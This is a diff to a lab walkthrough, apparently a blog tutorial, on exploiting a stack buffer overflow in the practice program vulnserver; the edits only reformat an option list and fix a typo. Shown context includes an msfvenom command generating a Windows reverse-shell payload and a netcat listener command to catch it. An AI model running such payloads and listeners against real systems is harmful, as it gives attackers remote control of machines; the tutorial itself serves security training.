@@ -321,13 +321,20 @@ Now that we know we control the EIP, we can generate a reverse shell.
 Using msfvenom we can create a reverse shell. Using the command
 ** msfvenom -p windows/shell_reverse_tcp lhost=kali ip lport= kali port exitfunc=thread -f c -a x86 -b "\x00"**
 where
-* -p means payload we want to use
-* lhost - kali ip address
-* lport - kali port to listen on
-* exitfunc=thread - makes the exploit more reliable
-* -f c - filetype for the exploit, in this case it is c
-* -a x86 - specifies the architecture
-* -b "x\00" - bad characters 
+* -p
+	means payload we want to use
+* lhost	
+	kali ip address
+* lport
+	kali port to listen on
+* exitfunc=thread
+	makes the exploit more reliable
+* -f c 
+	filetype for the exploit, in this case it is c
+* -a x86 
+	specifies the architecture
+* -b "x\00" 
+	bad characters 
 
 ![exp19](/images/vulnserver/stack/exp19.PNG)
 
@@ -385,6 +392,6 @@ while True:
 ```
 
 After modifying the script, create netcat listener with the command **nc -lvnp 9001** and start vulnserver again and finally run the exploit.
-Everything done correctly we will get a revese shell.
+Everything done correctly we will get a reverse shell.
 
 ![exp20](/images/vulnserver/stack/exp20.PNG)
